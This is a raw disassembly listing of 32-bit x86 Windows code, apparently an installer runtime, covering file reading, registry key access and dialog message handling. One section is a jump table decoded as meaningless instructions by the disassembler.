  4024ee:	e8 f1 38 00 00       	call   0x405de4
  4024f3:	3b c3                	cmp    %ebx,%eax
  4024f5:	0f 84 de 03 00 00    	je     0x4028d9
  4024fb:	50                   	push   %eax
  4024fc:	e9 bc f9 ff ff       	jmp    0x401ebd
  402501:	6a ed                	push   $0xffffffed
  402503:	e8 3c 05 00 00       	call   0x402a44
  402508:	ff 75 e0             	push   -0x20(%ebp)
  40250b:	ff 75 dc             	push   -0x24(%ebp)
  40250e:	50                   	push   %eax
  40250f:	e8 cc 35 00 00       	call   0x405ae0
  402514:	83 f8 ff             	cmp    $0xffffffff,%eax
  402517:	0f 84 91 01 00 00    	je     0x4026ae
  40251d:	50                   	push   %eax
  40251e:	e9 48 f0 ff ff       	jmp    0x40156b
  402523:	39 5d e0             	cmp    %ebx,-0x20(%ebp)
  402526:	74 10                	je     0x402538
  402528:	33 ff                	xor    %edi,%edi
  40252a:	47                   	inc    %edi
  40252b:	57                   	push   %edi
  40252c:	e8 f6 04 00 00       	call   0x402a27
  402531:	a2 00 98 40 00       	mov    %al,0x409800
  402536:	eb 0f                	jmp    0x402547
  402538:	6a 11                	push   $0x11
  40253a:	e8 05 05 00 00       	call   0x402a44
  40253f:	50                   	push   %eax
  402540:	e8 3e 39 00 00       	call   0x405e83
  402545:	8b f8                	mov    %eax,%edi
  402547:	38 1e                	cmp    %bl,(%esi)
  402549:	0f 84 61 01 00 00    	je     0x4026b0
  40254f:	56                   	push   %esi
  402550:	e8 8f 38 00 00       	call   0x405de4
  402555:	57                   	push   %edi
  402556:	68 00 98 40 00       	push   $0x409800
  40255b:	50                   	push   %eax
  40255c:	e8 26 36 00 00       	call   0x405b87
  402561:	e9 4a f0 ff ff       	jmp    0x4015b0
  402566:	6a 02                	push   $0x2
  402568:	89 5d f8             	mov    %ebx,-0x8(%ebp)
  40256b:	e8 b7 04 00 00       	call   0x402a27
  402570:	83 f8 01             	cmp    $0x1,%eax
  402573:	89 45 f4             	mov    %eax,-0xc(%ebp)
  402576:	0f 8c 5d 03 00 00    	jl     0x4028d9
  40257c:	b9 ff 03 00 00       	mov    $0x3ff,%ecx
  402581:	3b c1                	cmp    %ecx,%eax
  402583:	7e 03                	jle    0x402588
  402585:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  402588:	38 1e                	cmp    %bl,(%esi)
  40258a:	0f 84 82 00 00 00    	je     0x402612
  402590:	56                   	push   %esi
  402591:	88 5d 0b             	mov    %bl,0xb(%ebp)
  402594:	e8 4b 38 00 00       	call   0x405de4
  402599:	39 5d f4             	cmp    %ebx,-0xc(%ebp)
  40259c:	89 45 d0             	mov    %eax,-0x30(%ebp)
  40259f:	7e 71                	jle    0x402612
  4025a1:	8b 75 f8             	mov    -0x8(%ebp),%esi
  4025a4:	8d 45 f3             	lea    -0xd(%ebp),%eax
  4025a7:	6a 01                	push   $0x1
  4025a9:	50                   	push   %eax
  4025aa:	ff 75 d0             	push   -0x30(%ebp)
  4025ad:	e8 a6 35 00 00       	call   0x405b58
  4025b2:	85 c0                	test   %eax,%eax
  4025b4:	74 5f                	je     0x402615
  4025b6:	39 5d e4             	cmp    %ebx,-0x1c(%ebp)
  4025b9:	75 21                	jne    0x4025dc
  4025bb:	80 7d 0b 0d          	cmpb   $0xd,0xb(%ebp)
  4025bf:	74 2b                	je     0x4025ec
  4025c1:	80 7d 0b 0a          	cmpb   $0xa,0xb(%ebp)
  4025c5:	74 25                	je     0x4025ec
  4025c7:	8a 45 f3             	mov    -0xd(%ebp),%al
  4025ca:	88 04 3e             	mov    %al,(%esi,%edi,1)
  4025cd:	46                   	inc    %esi
  4025ce:	3a c3                	cmp    %bl,%al
  4025d0:	88 45 0b             	mov    %al,0xb(%ebp)
  4025d3:	74 40                	je     0x402615
  4025d5:	3b 75 f4             	cmp    -0xc(%ebp),%esi
  4025d8:	7c ca                	jl     0x4025a4
  4025da:	eb 39                	jmp    0x402615
  4025dc:	0f b6 45 f3          	movzbl -0xd(%ebp),%eax
  4025e0:	50                   	push   %eax
  4025e1:	57                   	push   %edi
  4025e2:	e8 e4 37 00 00       	call   0x405dcb
  4025e7:	e9 f6 02 00 00       	jmp    0x4028e2
  4025ec:	8a 45 f3             	mov    -0xd(%ebp),%al
  4025ef:	38 45 0b             	cmp    %al,0xb(%ebp)
  4025f2:	74 0e                	je     0x402602
  4025f4:	3c 0d                	cmp    $0xd,%al
  4025f6:	74 04                	je     0x4025fc
  4025f8:	3c 0a                	cmp    $0xa,%al
  4025fa:	75 06                	jne    0x402602
  4025fc:	88 04 3e             	mov    %al,(%esi,%edi,1)
  4025ff:	46                   	inc    %esi
  402600:	eb 13                	jmp    0x402615
  402602:	6a 01                	push   $0x1
  402604:	53                   	push   %ebx
  402605:	6a ff                	push   $0xffffffff
  402607:	ff 75 d0             	push   -0x30(%ebp)
  40260a:	ff 15 34 71 40 00    	call   *0x407134
  402610:	eb 03                	jmp    0x402615
  402612:	8b 75 f8             	mov    -0x8(%ebp),%esi
  402615:	88 1c 3e             	mov    %bl,(%esi,%edi,1)
  402618:	3b f3                	cmp    %ebx,%esi
  40261a:	e9 93 ef ff ff       	jmp    0x4015b2
  40261f:	38 1e                	cmp    %bl,(%esi)
  402621:	0f 84 b2 02 00 00    	je     0x4028d9
  402627:	ff 75 e4             	push   -0x1c(%ebp)
  40262a:	53                   	push   %ebx
  40262b:	6a 02                	push   $0x2
  40262d:	e8 f5 03 00 00       	call   0x402a27
  402632:	50                   	push   %eax
  402633:	56                   	push   %esi
  402634:	e8 ab 37 00 00       	call   0x405de4
  402639:	50                   	push   %eax
  40263a:	ff 15 34 71 40 00    	call   *0x407134
  402640:	39 5d dc             	cmp    %ebx,-0x24(%ebp)
  402643:	0f 8c 90 02 00 00    	jl     0x4028d9
  402649:	e9 31 02 00 00       	jmp    0x40287f
  40264e:	56                   	push   %esi
  40264f:	e8 90 37 00 00       	call   0x405de4
  402654:	3b c3                	cmp    %ebx,%eax
  402656:	0f 84 7d 02 00 00    	je     0x4028d9
  40265c:	50                   	push   %eax
  40265d:	ff 15 3c 71 40 00    	call   *0x40713c
  402663:	e9 71 02 00 00       	jmp    0x4028d9
  402668:	57                   	push   %edi
  402669:	e8 76 37 00 00       	call   0x405de4
  40266e:	3b c3                	cmp    %ebx,%eax
  402670:	74 12                	je     0x402684
  402672:	8d 8d 5c fe ff ff    	lea    -0x1a4(%ebp),%ecx
  402678:	51                   	push   %ecx
  402679:	50                   	push   %eax
  40267a:	ff 15 2c 71 40 00    	call   *0x40712c
  402680:	85 c0                	test   %eax,%eax
  402682:	75 3f                	jne    0x4026c3
  402684:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  40268b:	88 1e                	mov    %bl,(%esi)
  40268d:	e9 47 02 00 00       	jmp    0x4028d9
  402692:	6a 02                	push   $0x2
  402694:	e8 ab 03 00 00       	call   0x402a44
  402699:	8d 8d 5c fe ff ff    	lea    -0x1a4(%ebp),%ecx
  40269f:	51                   	push   %ecx
  4026a0:	50                   	push   %eax
  4026a1:	ff 15 28 71 40 00    	call   *0x407128
  4026a7:	83 f8 ff             	cmp    $0xffffffff,%eax
  4026aa:	75 10                	jne    0x4026bc
  4026ac:	88 1f                	mov    %bl,(%edi)
  4026ae:	88 1e                	mov    %bl,(%esi)
  4026b0:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  4026b7:	e9 1d 02 00 00       	jmp    0x4028d9
  4026bc:	50                   	push   %eax
  4026bd:	57                   	push   %edi
  4026be:	e8 08 37 00 00       	call   0x405dcb
  4026c3:	8d 85 88 fe ff ff    	lea    -0x178(%ebp),%eax
  4026c9:	50                   	push   %eax
  4026ca:	56                   	push   %esi
  4026cb:	e9 2f 01 00 00       	jmp    0x4027ff
  4026d0:	6a f0                	push   $0xfffffff0
  4026d2:	c7 45 f4 66 fd ff ff 	movl   $0xfffffd66,-0xc(%ebp)
  4026d9:	e8 66 03 00 00       	call   0x402a44
  4026de:	8b f0                	mov    %eax,%esi
  4026e0:	56                   	push   %esi
  4026e1:	89 75 c8             	mov    %esi,-0x38(%ebp)
  4026e4:	e8 63 32 00 00       	call   0x40594c
  4026e9:	85 c0                	test   %eax,%eax
  4026eb:	75 07                	jne    0x4026f4
  4026ed:	6a ed                	push   $0xffffffed
  4026ef:	e8 50 03 00 00       	call   0x402a44
  4026f4:	56                   	push   %esi
  4026f5:	e8 c1 33 00 00       	call   0x405abb
  4026fa:	6a 02                	push   $0x2
  4026fc:	68 00 00 00 40       	push   $0x40000000
  402701:	56                   	push   %esi
  402702:	e8 d9 33 00 00       	call   0x405ae0
  402707:	83 f8 ff             	cmp    $0xffffffff,%eax
  40270a:	89 45 08             	mov    %eax,0x8(%ebp)
  40270d:	0f 84 97 00 00 00    	je     0x4027aa
  402713:	a1 34 37 42 00       	mov    0x423734,%eax
  402718:	8b 35 60 71 40 00    	mov    0x407160,%esi
  40271e:	50                   	push   %eax
  40271f:	6a 40                	push   $0x40
  402721:	89 45 d0             	mov    %eax,-0x30(%ebp)
  402724:	ff d6                	call   *%esi
  402726:	8b f8                	mov    %eax,%edi
  402728:	3b fb                	cmp    %ebx,%edi
  40272a:	74 75                	je     0x4027a1
  40272c:	53                   	push   %ebx
  40272d:	e8 bb 0a 00 00       	call   0x4031ed
  402732:	ff 75 d0             	push   -0x30(%ebp)
  402735:	57                   	push   %edi
  402736:	e8 9c 0a 00 00       	call   0x4031d7
  40273b:	ff 75 e0             	push   -0x20(%ebp)
  40273e:	6a 40                	push   $0x40
  402740:	ff d6                	call   *%esi
  402742:	8b f0                	mov    %eax,%esi
  402744:	3b f3                	cmp    %ebx,%esi
  402746:	89 75 cc             	mov    %esi,-0x34(%ebp)
  402749:	74 34                	je     0x40277f
  40274b:	ff 75 e0             	push   -0x20(%ebp)
  40274e:	56                   	push   %esi
  40274f:	53                   	push   %ebx
  402750:	ff 75 dc             	push   -0x24(%ebp)
  402753:	e8 0e 08 00 00       	call   0x402f66
  402758:	eb 18                	jmp    0x402772
  40275a:	8b 0e                	mov    (%esi),%ecx
  40275c:	8b 46 04             	mov    0x4(%esi),%eax
  40275f:	83 c6 08             	add    $0x8,%esi
  402762:	51                   	push   %ecx
  402763:	03 c7                	add    %edi,%eax
  402765:	56                   	push   %esi
  402766:	50                   	push   %eax
  402767:	89 4d b0             	mov    %ecx,-0x50(%ebp)
  40276a:	e8 2c 33 00 00       	call   0x405a9b
  40276f:	03 75 b0             	add    -0x50(%ebp),%esi
  402772:	38 1e                	cmp    %bl,(%esi)
  402774:	75 e4                	jne    0x40275a
  402776:	ff 75 cc             	push   -0x34(%ebp)
  402779:	ff 15 24 71 40 00    	call   *0x407124
  40277f:	ff 75 d0             	push   -0x30(%ebp)
  402782:	57                   	push   %edi
  402783:	ff 75 08             	push   0x8(%ebp)
  402786:	e8 fc 33 00 00       	call   0x405b87
  40278b:	57                   	push   %edi
  40278c:	ff 15 24 71 40 00    	call   *0x407124
  402792:	53                   	push   %ebx
  402793:	53                   	push   %ebx
  402794:	ff 75 08             	push   0x8(%ebp)
  402797:	6a ff                	push   $0xffffffff
  402799:	e8 c8 07 00 00       	call   0x402f66
  40279e:	89 45 f4             	mov    %eax,-0xc(%ebp)
  4027a1:	ff 75 08             	push   0x8(%ebp)
  4027a4:	ff 15 f4 70 40 00    	call   *0x4070f4
  4027aa:	39 5d f4             	cmp    %ebx,-0xc(%ebp)
  4027ad:	6a f3                	push   $0xfffffff3
  4027af:	5e                   	pop    %esi
  4027b0:	7d 13                	jge    0x4027c5
  4027b2:	6a ef                	push   $0xffffffef
  4027b4:	5e                   	pop    %esi
  4027b5:	ff 75 c8             	push   -0x38(%ebp)
  4027b8:	ff 15 30 71 40 00    	call   *0x407130
  4027be:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  4027c5:	56                   	push   %esi
  4027c6:	e9 03 fa ff ff       	jmp    0x4021ce
  4027cb:	53                   	push   %ebx
  4027cc:	e8 56 02 00 00       	call   0x402a27
  4027d1:	3b 05 4c 37 42 00    	cmp    0x42374c,%eax
  4027d7:	89 45 08             	mov    %eax,0x8(%ebp)
  4027da:	0f 83 d0 fe ff ff    	jae    0x4026b0
  4027e0:	8b f0                	mov    %eax,%esi
  4027e2:	8b 45 e0             	mov    -0x20(%ebp),%eax
  4027e5:	69 f6 18 04 00 00    	imul   $0x418,%esi,%esi
  4027eb:	03 35 48 37 42 00    	add    0x423748,%esi
  4027f1:	3b c3                	cmp    %ebx,%eax
  4027f3:	7c 17                	jl     0x40280c
  4027f5:	8b 0c 86             	mov    (%esi,%eax,4),%ecx
  4027f8:	75 0f                	jne    0x402809
  4027fa:	83 c6 18             	add    $0x18,%esi
  4027fd:	56                   	push   %esi
  4027fe:	57                   	push   %edi
  4027ff:	e8 69 36 00 00       	call   0x405e6d
  402804:	e9 d0 00 00 00       	jmp    0x4028d9
  402809:	51                   	push   %ecx
  40280a:	eb 74                	jmp    0x402880
  40280c:	83 c9 ff             	or     $0xffffffff,%ecx
  40280f:	2b c8                	sub    %eax,%ecx
  402811:	89 4d e0             	mov    %ecx,-0x20(%ebp)
  402814:	74 0c                	je     0x402822
  402816:	6a 01                	push   $0x1
  402818:	e8 0a 02 00 00       	call   0x402a27
  40281d:	89 45 dc             	mov    %eax,-0x24(%ebp)
  402820:	eb 10                	jmp    0x402832
  402822:	ff 75 e8             	push   -0x18(%ebp)
  402825:	8d 46 18             	lea    0x18(%esi),%eax
  402828:	50                   	push   %eax
  402829:	e8 61 36 00 00       	call   0x405e8f
  40282e:	80 4e 09 01          	orb    $0x1,0x9(%esi)
  402832:	8b 45 e0             	mov    -0x20(%ebp),%eax
  402835:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  402838:	89 0c 86             	mov    %ecx,(%esi,%eax,4)
  40283b:	39 5d e4             	cmp    %ebx,-0x1c(%ebp)
  40283e:	0f 84 95 00 00 00    	je     0x4028d9
  402844:	ff 75 08             	push   0x8(%ebp)
  402847:	e8 3b e9 ff ff       	call   0x401187
  40284c:	e9 88 00 00 00       	jmp    0x4028d9
  402851:	53                   	push   %ebx
  402852:	e8 d0 01 00 00       	call   0x402a27
  402857:	83 f8 20             	cmp    $0x20,%eax
  40285a:	0f 83 50 fe ff ff    	jae    0x4026b0
  402860:	39 5d e4             	cmp    %ebx,-0x1c(%ebp)
  402863:	74 23                	je     0x402888
  402865:	39 5d e0             	cmp    %ebx,-0x20(%ebp)
  402868:	74 0f                	je     0x402879
  40286a:	50                   	push   %eax
  40286b:	e8 33 ea ff ff       	call   0x4012a3
  402870:	53                   	push   %ebx
  402871:	53                   	push   %ebx
  402872:	e8 82 e9 ff ff       	call   0x4011f9
  402877:	eb 60                	jmp    0x4028d9
  402879:	53                   	push   %ebx
  40287a:	e8 6d ea ff ff       	call   0x4012ec
  40287f:	50                   	push   %eax
  402880:	57                   	push   %edi
  402881:	e8 45 35 00 00       	call   0x405dcb
  402886:	eb 51                	jmp    0x4028d9
  402888:	39 5d e0             	cmp    %ebx,-0x20(%ebp)
  40288b:	74 12                	je     0x40289f
  40288d:	8b 15 30 37 42 00    	mov    0x423730,%edx
  402893:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  402896:	89 8c 82 94 00 00 00 	mov    %ecx,0x94(%edx,%eax,4)
  40289d:	eb 3a                	jmp    0x4028d9
  40289f:	8b 0d 30 37 42 00    	mov    0x423730,%ecx
  4028a5:	ff b4 81 94 00 00 00 	push   0x94(%ecx,%eax,4)
  4028ac:	57                   	push   %edi
  4028ad:	e8 dd 35 00 00       	call   0x405e8f
  4028b2:	eb 25                	jmp    0x4028d9
  4028b4:	8b 0d 30 0d 42 00    	mov    0x420d30,%ecx
  4028ba:	53                   	push   %ebx
  4028bb:	23 c8                	and    %eax,%ecx
  4028bd:	51                   	push   %ecx
  4028be:	6a 0b                	push   $0xb
  4028c0:	ff 75 f8             	push   -0x8(%ebp)
  4028c3:	ff 15 00 72 40 00    	call   *0x407200
  4028c9:	39 5d d8             	cmp    %ebx,-0x28(%ebp)
  4028cc:	74 0b                	je     0x4028d9
  4028ce:	53                   	push   %ebx
  4028cf:	53                   	push   %ebx
  4028d0:	ff 75 f8             	push   -0x8(%ebp)
  4028d3:	ff 15 fc 71 40 00    	call   *0x4071fc
  4028d9:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4028dc:	01 05 a8 37 42 00    	add    %eax,0x4237a8
  4028e2:	33 c0                	xor    %eax,%eax
  4028e4:	5f                   	pop    %edi
  4028e5:	5e                   	pop    %esi
  4028e6:	5b                   	pop    %ebx
  4028e7:	c9                   	leave
  4028e8:	c2 04 00             	ret    $0x4
  4028eb:	da 28                	fisubrl (%eax)
  4028ed:	40                   	inc    %eax
  4028ee:	00 90 14 40 00 9c    	add    %dl,-0x63ffbfec(%eax)
  4028f4:	14 40                	adc    $0x40,%al
  4028f6:	00 b7 14 40 00 ca    	add    %dh,-0x35ffbfec(%edi)
  4028fc:	14 40                	adc    $0x40,%al
  4028fe:	00 d6                	add    %dl,%dh
  402900:	14 40                	adc    $0x40,%al
  402902:	00 f0                	add    %dh,%al
  402904:	14 40                	adc    $0x40,%al
  402906:	00 67 15             	add    %ah,0x15(%edi)
  402909:	40                   	inc    %eax
  40290a:	00 95 15 40 00 b3    	add    %dl,-0x4cffbfeb(%ebp)
  402910:	15 40 00 51 16       	adc    $0x16510040,%eax
  402915:	40                   	inc    %eax
  402916:	00 fe                	add    %bh,%dh
  402918:	14 40                	adc    $0x40,%al
  40291a:	00 39                	add    %bh,(%ecx)
  40291c:	15 40 00 5a 15       	adc    $0x155a0040,%eax
  402921:	40                   	inc    %eax
  402922:	00 62 16             	add    %ah,0x16(%edx)
  402925:	40                   	inc    %eax
  402926:	00 b3 16 40 00 17    	add    %dh,0x17004016(%ebx)
  40292c:	17                   	pop    %ss
  40292d:	40                   	inc    %eax
  40292e:	00 3e                	add    %bh,(%esi)
  402930:	17                   	pop    %ss
  402931:	40                   	inc    %eax
  402932:	00 51 17             	add    %dl,0x17(%ecx)
  402935:	40                   	inc    %eax
  402936:	00 f5                	add    %dh,%ch
  402938:	18 40 00             	sbb    %al,0x0(%eax)
  40293b:	f8                   	clc
  40293c:	18 40 00             	sbb    %al,0x0(%eax)
  40293f:	2a 19                	sub    (%ecx),%bl
  402941:	40                   	inc    %eax
  402942:	00 3f                	add    %bh,(%edi)
  402944:	19 40 00             	sbb    %eax,0x0(%eax)
  402947:	51                   	push   %ecx
  402948:	19 40 00             	sbb    %eax,0x0(%eax)
  40294b:	d2 19                	rcrb   %cl,(%ecx)
  40294d:	40                   	inc    %eax
  40294e:	00 03                	add    %al,(%ebx)
  402950:	1a 40 00             	sbb    0x0(%eax),%al
  402953:	43                   	inc    %ebx
  402954:	1a 40 00             	sbb    0x0(%eax),%al
  402957:	75 1a                	jne    0x402973
  402959:	40                   	inc    %eax
  40295a:	00 02                	add    %al,(%edx)
  40295c:	1b 40 00             	sbb    0x0(%eax),%eax
  40295f:	23 1b                	and    (%ebx),%ebx
  402961:	40                   	inc    %eax
  402962:	00 ca                	add    %cl,%dl
  402964:	1b 40 00             	sbb    0x0(%eax),%eax
  402967:	ca 1b 40             	lret   $0x401b
  40296a:	00 8a 1c 40 00 a7    	add    %cl,-0x58ffbfe4(%edx)
  402970:	1c 40                	sbb    $0x40,%al
  402972:	00 c2                	add    %al,%dl
  402974:	1c 40                	sbb    $0x40,%al
  402976:	00 de                	add    %bl,%dh
  402978:	1c 40                	sbb    $0x40,%al
  40297a:	00 38                	add    %bh,(%eax)
  40297c:	1d 40 00 be 1d       	sbb    $0x1dbe0040,%eax
  402981:	40                   	inc    %eax
  402982:	00 ea                	add    %ch,%dl
  402984:	1d 40 00 44 1e       	sbb    $0x1e440040,%eax
  402989:	40                   	inc    %eax
  40298a:	00 be 1e 40 00 ee    	add    %bh,-0x11ffbfe2(%esi)
  402990:	1e                   	push   %ds
  402991:	40                   	inc    %eax
  402992:	00 8f 1f 40 00 5e    	add    %cl,0x5e00401f(%edi)
  402998:	20 40 00             	and    %al,0x0(%eax)
  40299b:	d2 21                	shlb   %cl,(%ecx)
  40299d:	40                   	inc    %eax
  40299e:	00 54 22 40          	add    %dl,0x40(%edx,%eiz,1)
  4029a2:	00 83 22 40 00 c7    	add    %al,-0x38ffbfde(%ebx)
  4029a8:	22 40 00             	and    0x0(%eax),%al
  4029ab:	08 23                	or     %ah,(%ebx)
  4029ad:	40                   	inc    %eax
  4029ae:	00 64 23 40          	add    %ah,0x40(%ebx,%eiz,1)
  4029b2:	00 10                	add    %dl,(%eax)
  4029b4:	24 40                	and    $0x40,%al
  4029b6:	00 82 24 40 00 e3    	add    %al,-0x1cffbfdc(%edx)
  4029bc:	24 40                	and    $0x40,%al
  4029be:	00 f7                	add    %dh,%bh
  4029c0:	24 40                	and    $0x40,%al
  4029c2:	00 19                	add    %bl,(%ecx)
  4029c4:	25 40 00 5c 25       	and    $0x255c0040,%eax
  4029c9:	40                   	inc    %eax
  4029ca:	00 15 26 40 00 44    	add    %dl,0x44004026
  4029d0:	26 40                	es inc %eax
  4029d2:	00 5e 26             	add    %bl,0x26(%esi)
  4029d5:	40                   	inc    %eax
  4029d6:	00 88 26 40 00 c6    	add    %cl,-0x39ffbfda(%eax)
  4029dc:	26 40                	es inc %eax
  4029de:	00 c1                	add    %al,%cl
  4029e0:	27                   	daa
  4029e1:	40                   	inc    %eax
  4029e2:	00 47 28             	add    %al,0x28(%edi)
  4029e5:	40                   	inc    %eax
  4029e6:	00 cf                	add    %cl,%bh
  4029e8:	28 40 00             	sub    %al,0x0(%eax)
  4029eb:	cf                   	iret
  4029ec:	28 40 00             	sub    %al,0x0(%eax)
  4029ef:	aa                   	stos   %al,%es:(%edi)
  4029f0:	28 40 00             	sub    %al,0x0(%eax)
  4029f3:	96                   	xchg   %eax,%esi
  4029f4:	1a 40 00             	sbb    0x0(%eax),%al
  4029f7:	9a 1a 40 00 9e 1a 40 	lcall  $0x401a,$0x9e00401a
  4029fe:	00 a5 1a 40 00 b2    	add    %ah,-0x4dffbfe6(%ebp)
  402a04:	1a 40 00             	sbb    0x0(%eax),%al
  402a07:	b6 1a                	mov    $0x1a,%dh
  402a09:	40                   	inc    %eax
  402a0a:	00 ba 1a 40 00 be    	add    %bh,-0x41ffbfe6(%edx)
  402a10:	1a 40 00             	sbb    0x0(%eax),%al
  402a13:	c7                   	(bad)
  402a14:	1a 40 00             	sbb    0x0(%eax),%al
  402a17:	d1 1a                	rcrl   $1,(%edx)
  402a19:	40                   	inc    %eax
  402a1a:	00 de                	add    %bl,%dh
  402a1c:	1a 40 00             	sbb    0x0(%eax),%al
  402a1f:	f6 1a                	negb   (%edx)
  402a21:	40                   	inc    %eax
  402a22:	00 fa                	add    %bh,%dl
  402a24:	1a 40 00             	sbb    0x0(%eax),%al
  402a27:	8b 44 24 04          	mov    0x4(%esp),%eax
  402a2b:	8b 0d 00 a8 40 00    	mov    0x40a800,%ecx
  402a31:	ff 34 81             	push   (%ecx,%eax,4)
  402a34:	6a 00                	push   $0x0
  402a36:	e8 54 34 00 00       	call   0x405e8f
  402a3b:	50                   	push   %eax
  402a3c:	e8 a3 33 00 00       	call   0x405de4
  402a41:	c2 04 00             	ret    $0x4
  402a44:	56                   	push   %esi
  402a45:	8b 74 24 08          	mov    0x8(%esp),%esi
  402a49:	85 f6                	test   %esi,%esi
  402a4b:	57                   	push   %edi
  402a4c:	8b c6                	mov    %esi,%eax
  402a4e:	7d 02                	jge    0x402a52
  402a50:	f7 d8                	neg    %eax
  402a52:	8b 15 00 a8 40 00    	mov    0x40a800,%edx
  402a58:	8b c8                	mov    %eax,%ecx
  402a5a:	83 e1 0f             	and    $0xf,%ecx
  402a5d:	c1 f8 04             	sar    $0x4,%eax
  402a60:	ff 34 8a             	push   (%edx,%ecx,4)
  402a63:	c1 e0 0a             	shl    $0xa,%eax
  402a66:	05 00 94 40 00       	add    $0x409400,%eax
  402a6b:	50                   	push   %eax
  402a6c:	e8 1e 34 00 00       	call   0x405e8f
  402a71:	85 f6                	test   %esi,%esi
  402a73:	8b f8                	mov    %eax,%edi
  402a75:	7d 06                	jge    0x402a7d
  402a77:	57                   	push   %edi
  402a78:	e8 5b 36 00 00       	call   0x4060d8
  402a7d:	8b c7                	mov    %edi,%eax
  402a7f:	5f                   	pop    %edi
  402a80:	5e                   	pop    %esi
  402a81:	c2 04 00             	ret    $0x4
  402a84:	55                   	push   %ebp
  402a85:	8b ec                	mov    %esp,%ebp
  402a87:	81 ec 0c 01 00 00    	sub    $0x10c,%esp
  402a8d:	53                   	push   %ebx
  402a8e:	56                   	push   %esi
  402a8f:	8d 45 fc             	lea    -0x4(%ebp),%eax
  402a92:	57                   	push   %edi
  402a93:	50                   	push   %eax
  402a94:	a1 d0 37 42 00       	mov    0x4237d0,%eax
  402a99:	0c 08                	or     $0x8,%al
  402a9b:	33 db                	xor    %ebx,%ebx
  402a9d:	50                   	push   %eax
  402a9e:	53                   	push   %ebx
  402a9f:	ff 75 0c             	push   0xc(%ebp)
  402aa2:	ff 75 08             	push   0x8(%ebp)
  402aa5:	ff 15 14 70 40 00    	call   *0x407014
  402aab:	3b c3                	cmp    %ebx,%eax
  402aad:	75 69                	jne    0x402b18
  402aaf:	8b 35 30 70 40 00    	mov    0x407030,%esi
  402ab5:	bf 05 01 00 00       	mov    $0x105,%edi
  402aba:	eb 19                	jmp    0x402ad5
  402abc:	39 5d 10             	cmp    %ebx,0x10(%ebp)
  402abf:	75 4b                	jne    0x402b0c
  402ac1:	8d 85 f4 fe ff ff    	lea    -0x10c(%ebp),%eax
  402ac7:	53                   	push   %ebx
  402ac8:	50                   	push   %eax
  402ac9:	ff 75 fc             	push   -0x4(%ebp)
  402acc:	e8 b3 ff ff ff       	call   0x402a84
  402ad1:	85 c0                	test   %eax,%eax
  402ad3:	75 12                	jne    0x402ae7
  402ad5:	8d 85 f4 fe ff ff    	lea    -0x10c(%ebp),%eax
  402adb:	57                   	push   %edi
  402adc:	50                   	push   %eax
  402add:	53                   	push   %ebx
  402ade:	ff 75 fc             	push   -0x4(%ebp)
  402ae1:	ff d6                	call   *%esi
  402ae3:	85 c0                	test   %eax,%eax
  402ae5:	74 d5                	je     0x402abc
  402ae7:	ff 75 fc             	push   -0x4(%ebp)
  402aea:	ff 15 20 70 40 00    	call   *0x407020
  402af0:	6a 03                	push   $0x3
  402af2:	e8 0f 37 00 00       	call   0x406206
  402af7:	3b c3                	cmp    %ebx,%eax
  402af9:	74 24                	je     0x402b1f
  402afb:	53                   	push   %ebx
  402afc:	ff 35 d0 37 42 00    	push   0x4237d0
  402b02:	ff 75 0c             	push   0xc(%ebp)
  402b05:	ff 75 08             	push   0x8(%ebp)
  402b08:	ff d0                	call   *%eax
  402b0a:	eb 0c                	jmp    0x402b18
  402b0c:	ff 75 fc             	push   -0x4(%ebp)
  402b0f:	ff 15 20 70 40 00    	call   *0x407020
  402b15:	33 c0                	xor    %eax,%eax
  402b17:	40                   	inc    %eax
  402b18:	5f                   	pop    %edi
  402b19:	5e                   	pop    %esi
  402b1a:	5b                   	pop    %ebx
  402b1b:	c9                   	leave
  402b1c:	c2 0c 00             	ret    $0xc
  402b1f:	39 1d d0 37 42 00    	cmp    %ebx,0x4237d0
  402b25:	75 ee                	jne    0x402b15
  402b27:	ff 75 0c             	push   0xc(%ebp)
  402b2a:	ff 75 08             	push   0x8(%ebp)
  402b2d:	ff 15 00 70 40 00    	call   *0x407000
  402b33:	85 c0                	test   %eax,%eax
  402b35:	75 de                	jne    0x402b15
  402b37:	eb df                	jmp    0x402b18
  402b39:	8b 44 24 04          	mov    0x4(%esp),%eax
  402b3d:	85 c0                	test   %eax,%eax
  402b3f:	75 0a                	jne    0x402b4b
  402b41:	a1 a4 37 42 00       	mov    0x4237a4,%eax
  402b46:	05 01 00 00 80       	add    $0x80000001,%eax
  402b4b:	c2 04 00             	ret    $0x4
  402b4e:	55                   	push   %ebp
  402b4f:	8b ec                	mov    %esp,%ebp
  402b51:	8d 45 08             	lea    0x8(%ebp),%eax
  402b54:	50                   	push   %eax
  402b55:	a1 d0 37 42 00       	mov    0x4237d0,%eax
  402b5a:	0b 45 08             	or     0x8(%ebp),%eax
  402b5d:	50                   	push   %eax
  402b5e:	6a 00                	push   $0x0
  402b60:	6a 22                	push   $0x22
  402b62:	e8 dd fe ff ff       	call   0x402a44
  402b67:	50                   	push   %eax
  402b68:	a1 00 a8 40 00       	mov    0x40a800,%eax
  402b6d:	ff 70 04             	push   0x4(%eax)
  402b70:	e8 c4 ff ff ff       	call   0x402b39
  402b75:	50                   	push   %eax
  402b76:	ff 15 14 70 40 00    	call   *0x407014
  402b7c:	f7 d8                	neg    %eax
  402b7e:	1b c0                	sbb    %eax,%eax
  402b80:	f7 d0                	not    %eax
  402b82:	23 45 08             	and    0x8(%ebp),%eax
  402b85:	5d                   	pop    %ebp
  402b86:	c2 04 00             	ret    $0x4
  402b89:	55                   	push   %ebp
  402b8a:	8b ec                	mov    %esp,%ebp
  402b8c:	83 ec 40             	sub    $0x40,%esp
  402b8f:	81 7d 0c 10 01 00 00 	cmpl   $0x110,0xc(%ebp)
  402b96:	75 19                	jne    0x402bb1
  402b98:	6a 00                	push   $0x0
  402b9a:	68 fa 00 00 00       	push   $0xfa
  402b9f:	6a 01                	push   $0x1
  402ba1:	ff 75 08             	push   0x8(%ebp)
  402ba4:	ff 15 40 72 40 00    	call   *0x407240
  402baa:	c7 45 0c 13 01 00 00 	movl   $0x113,0xc(%ebp)
  402bb1:	81 7d 0c 13 01 00 00 	cmpl   $0x113,0xc(%ebp)
  402bb8:	75 45                	jne    0x402bff
